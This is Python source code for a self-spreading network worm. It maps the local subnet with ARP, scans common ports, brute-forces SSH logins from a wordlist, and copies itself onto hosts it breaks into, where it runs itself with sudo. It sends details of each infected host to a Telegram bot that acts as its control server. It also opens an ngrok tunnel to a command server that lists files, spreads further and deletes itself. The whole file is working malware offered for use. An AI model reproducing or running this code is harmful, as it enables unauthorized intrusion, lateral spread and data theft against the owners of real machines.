import json
import requests
import paramiko
import scp as sc
import multiprocessing as mp
import netifaces
import ipcalc
import netaddr
import sys
import subprocess
import logging
import os
from scapy.all import *
from pyngrok import ngrok
from http.server import BaseHTTPRequestHandler, HTTPServer

"""
PROPAGATION
"""
def propagate(host,port,username,password):
	files = ["config.json","credentials.txt","worm.py","requirements.txt"]
	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host,port,username,password)
		scp = sc.SCPClient(ssh.get_transport())
		scp.put(files,"~/")
		scp.close()
		
		command = "echo " + password + " | sudo -S apt install python3-pip -y > /dev/null 2>&1 ;" + \
			  "sudo pip3 install -r ~/requirements.txt > /dev/null 2>&1 ;" + \
			  "echo " + password + " | sudo -S python3 ~/worm.py > /dev/null 2>&1"
		
		channel = ssh.get_transport().open_session()
		channel.exec_command(command)
		channel.close()
		
		ssh.close()
		return "spreaded in " + host + " and executed itself on target machine. Wait for the message to give commands"
	except:
		ssh.close()
		return "not possible to spread, are credentials right?"
		

"""
SSH BRUTE FORCE
"""
def connection_established(host,port,username,password):
	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host,port,username,password)
		ssh.close()
		return True
	except:
		if ssh:
			ssh.close()
		return False
		
def check_port_22(target_ip,port):
	is_open = False		
	
	tcp = TCP(sport=3333,dport=port,flags="S")
	ip = IP(dst=target_ip)
	SYN = ip/tcp
	SYNACK = sr1(SYN,verbose=0,timeout=1,retry=2)
	if SYNACK and 'R' not in SYNACK[TCP].flags:
		is_open = True
		
	return is_open

def ssh_brute_force(host,port):

	if not check_port_22(host,port): return "Given host doesn't exits or has port 22 closed"

	creds_file = open("credentials.txt","r")
	cred_list = creds_file.read().split("\n")
	creds_file.close()
	cred_list = [creds.split(",") for creds in cred_list if creds]
	
	for index in range(0,len(cred_list)):
		cred_list[index].insert(0,port)
		cred_list[index].insert(0,host)
		
	pool = mp.Pool()
	results = pool.starmap(connection_established,cred_list)

	if True in results:
		credentials = cred_list[results.index(True)]  
	else: 
		credentials ="password not in the wordlist"

	return credentials

	
"""
PORT SCAN
"""
def scan(target_ip):
	
	open_ports = []
	
	for port in  [20,21,22,23,25,53,80,443,5900,8080]:
		tcp = TCP(sport=2525,dport=port,flags="S")
		ip = IP(dst=target_ip)
		SYN = ip/tcp
		SYNACK = sr1(SYN,verbose=0,timeout=2,retry=2)
		if SYNACK and 'R' not in SYNACK[TCP].flags:
			open_ports.append(port)
			
	return [target_ip,open_ports]

def port_scan(network):

	targets = [elem[0] for elem in network]
	pool = mp.Pool()
	results = pool.map(scan,targets)
	results = [elem for elem in results if elem[1]]
	
	return results
	
	
"""
NETWORK DISCOVERY
"""
def send_arp(ip_address):
	arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
	response = srp1(arp_packet,verbose=False,timeout=0.5,retry=2)
	if response: return [ip_address,response[ARP].hwsrc]
	else: return 0
		
def discover_network(subnet):
	pool = mp.Pool()
	results = pool.map(send_arp,subnet)
	results = [elem for elem in results if elem != 0]
	
	return results

def calculate_subnet(host,netmask,gateway,broadcast):
	cidr = str(netaddr.IPAddress(netmask).netmask_bits())
	subnet = ipcalc.Network(host+"/"+ cidr)
	subnet = [str(ip) for ip in subnet if str(ip) != gateway and \
					       str(ip) != broadcast and \
					       str(ip) != host]
	return subnet
	
"""
SEND FEEDBACK TO CONTROL SERVER
"""
def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,code,devices_open_ports=None):
	public_ip = requests.get("https://api.ipify.org").text
	status = "Infected host informations:\n" + \
		 "host public ip: " + public_ip + "\n" + \
		 "host private ip: " + host_ip + "\n" + \
		 "netmask: " + netmask + "\n" + \
		 "broadcast: " + broadcast + "\n" + \
		 "gateway: " + gateway + "\n\n"
		 
	status += "effective user : " + os.environ["USER"] + "\n" + "sudo user : " + os.environ["SUDO_USER"] + "\n\n"
	
	if code == 1:
		status += "Alone in the network!\n"
	elif code == 2:
		status += "All devices on the network have well known ports closed!\n"
	elif code == 3:
		status += "Network I'm in:\n"
		for elem in devices_open_ports:
			status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n" 

		status += "No devices with port 22 opened, not possible to spread!\n"
	elif code == 4:
		status += "Network I'm in:\n"
		for elem in devices_open_ports:
			status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n"
		
	print("> sending feedback to control server...")
	post_req = requests.post("https://api.telegram.org/bot"+token+ \
				  "/sendMessage",data={"chat_id":chat_id,"text":status})
				  
"""
DETERMINE WICH INTERFACE I'M USING
"""
def determine_if():
	interfaces = netifaces.interfaces()
	interfaces = [elem for elem in interfaces if elem != 'lo']
	
	online_interfaces = []
	
	for interface in interfaces:
		if netifaces.AF_INET in netifaces.ifaddresses(interface).keys():
			online_interfaces.append(interface)
	
	if not online_interfaces: return 0
	else: return online_interfaces[0]
	
"""
HTTP SERVER FUNCTIONALITIES
"""
def delete():
	command = ["rm","config.json","credentials.txt","worm.py","requirements.txt"]
	process = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
	sys.exit()
		
def ls(path):
	process = subprocess.run(["ls",path],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
	
	if not process.stderr:
		return process.stdout
	else:
		return process.stderr
		
def tree_home():
	process = subprocess.run(["tree","/home"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
	return process.stdout
	
def execute_command(command,ls_path=None,ssh_bf_target=None,s_target=None,s_username=None,s_password=None):
	if command == "ls":
		return ls(ls_path)
	elif command == "delete":
		delete()
		
	elif command == "ssh_brute_force":
		return str(ssh_brute_force(ssh_bf_target,22))
	
	elif command == "spread":
		return propagate(s_target,22,s_username,s_password)
		
	elif command == "tree_home":
		return tree_home()
	
class request_handler(BaseHTTPRequestHandler):

	def do_POST(self):
		"""
		READ POST REQUEST
		"""
		content_length = int(self.headers["Content-Length"])
		post_data = self.rfile.read(content_length)
		
		
		allowed_commands = ["ls","delete","tree_home","ssh_brute_force","spread"]
		command_args = post_data.decode("utf-8").split("&")
		command = command_args[0] 
		
		if command in allowed_commands:
		
			if len(command_args) == 2 and command == "ls":
				path = command_args[1]
				output = execute_command(command,ls_path=path)
				
			elif len(command_args) == 2 and command == "ssh_brute_force":
				target = command_args[1]
				output = execute_command(command,ssh_bf_target=target)
			elif len(command_args) == 4 and command == "spread":
				target = command_args[1]
				username = command_args[2]
				password = command_args[3]
				output = execute_command(command,s_target=target,s_username=username,s_password=password)
			else:
				output = execute_command(command)
			"""
			RESPONSE HEADERS
			"""
			self.send_response(200)
			self.send_header("Content-type","text/html; charset=utf-8")
			self.end_headers()
			
			"""
			RESPONSE DATA
			"""
			self.wfile.write(output.encode("utf-8"))
		else:
			self.send_response(400)
			self.send_header("Content-type","text/html; charset=utf-8")
			self.end_headers()
			self.wfile.write(b"command not allowed")

class no_ssh_request_handler(BaseHTTPRequestHandler):

	def do_POST(self):
		"""
		READ POST REQUEST
		"""
		content_length = int(self.headers["Content-Length"])
		post_data = self.rfile.read(content_length)
		
		
		allowed_commands = ["ls","delete","tree_home"]
		command_args = post_data.decode("utf-8").split("&")
		command = command_args[0]
		
		if command in allowed_commands:
			if len(command_args) == 2 and command == "ls":
				path = command_args[1]
				output = execute_command(command,ls_path=path)
			else:
				output = execute_command(command)
			"""
			RESPONSE HEADERS
			"""
			self.send_response(200)
			self.send_header("Content-type","text/html; charset=utf-8")
			self.end_headers()
			
			"""
			RESPONSE DATA
			"""
			self.wfile.write(output.encode("utf-8"))
		else:
			self.send_response(400)
			self.send_header("Content-type","text/html; charset=utf-8")
			self.end_headers()
			self.wfile.write(b"command not allowed")
		

def run_server(host,port,tel_token,chat_id,ssh_enabled=False):
	http_tunnel = ngrok.connect(port)	
	print("> opening http tunnel at: " + http_tunnel.public_url)
	
	"""
	COMMUNICATING TUNNEL URL TO CONTROL SERVER
	"""
	post_req = requests.post("https://api.telegram.org/bot"+tel_token+"/sendMessage", \
				      data={"chat_id":chat_id,"text":"tunnel: "+http_tunnel.public_url})
		
	"""
	STARTING WEB SERVER
	"""
	print("> starting http server. Waiting for commands...")
	
	if ssh_enabled: 
		webserver = HTTPServer((host,port),request_handler)
	else:
		webserver = HTTPServer((host,port),no_ssh_request_handler)
	
	try:
		webserver.serve_forever()
	except KeyboardInterrupt:
		pass
	
	webserver.server_close()

if __name__ == "__main__":

	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
	
	### CHECK IF ONLINE ###
	print("> checking if host is online")
	interface = determine_if()
	if interface == 0 : sys.exit("... Not online")
	
	### CONFIG ###
	con_file = open("config.json","r")
	config = json.load(con_file)
	con_file.close()

	### NETWORK DISCOVERY ###
	print("> discovering network")
	
	info = netifaces.ifaddresses(interface)[netifaces.AF_INET]
	host_ip = info[0]['addr']
	netmask = info[0]['netmask']
	gateway = netifaces.gateways()[netifaces.AF_INET][0][0]
	broadcast = info[0]['broadcast']
	
	subnet = calculate_subnet(host_ip,netmask,gateway,broadcast)
	
	network = discover_network(subnet)
	if not network:
		print("... No other active devices in the network")
		send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,1)
		run_server("localhost",2525,config["http_token"],config["chat_id"])
		sys.exit()
	
	### PORT SCAN OF EACH DEVICE ON THE NETWORK ###
	print("> scanning each device's ports on the network")
	
	devices_open_ports = port_scan(network)
	if not devices_open_ports:
		print("... All devices on the network have well known ports closed")
		send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,2)
		run_server("localhost",2525,config["http_token"],config["chat_id"])
		sys.exit()
	
	### CHECKING FOR DEVICES WITH PORT 22 OPENED ###
	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
	if not ssh_targets:
		print("... No devices with port 22 opened")
		send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,3,devices_open_ports=devices_open_ports)
		run_server("localhost",2525,config["http_token"],config["chat_id"])
		sys.exit()
	
	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
	send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,4,devices_open_ports=devices_open_ports)
	
	### RUNNING HTTP WEB SERVER ###
	run_server("localhost",2525,config["http_token"],config["chat_id"],True)
